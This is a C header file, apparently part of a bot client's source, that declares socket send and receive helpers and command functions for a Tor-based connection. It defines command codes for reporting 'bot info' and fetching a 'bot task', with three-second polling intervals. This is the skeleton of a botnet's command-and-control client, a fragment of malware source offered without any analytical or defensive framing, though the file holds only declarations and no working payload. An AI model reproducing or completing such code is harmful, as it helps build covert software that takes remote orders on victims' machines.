#pragma once

#include "connection_tor.h"

//
#define SOCKET_SEND_RECV_DEFAULT_TIMEOUT 20000

//
bool COMMAND_TYPE_1(int command_code, char* command_data, int command_data_len);
bool COMMAND_TYPE_2(int command_code, char* command_data, int command_data_len, char* data_from_server, int* data_from_server_len);

//
bool init_socket(SOCKET* s);

//
char* recv_by_length_exactly(SOCKET s, unsigned int exact_length);
int send_all(SOCKET socket, void* buffer, size_t length, int flags);

// command types
#define BOT_AUTO_UPDATE_LASTSEEN_INTERVAL 3000
#define COMMAND_TYPE_1_BOT_INFO 1



//
#define BOT_AUTO_GET_TASK_INTERVAL 3000
#define COMMAND_TYPE_2_BOT_GET_TASK 50
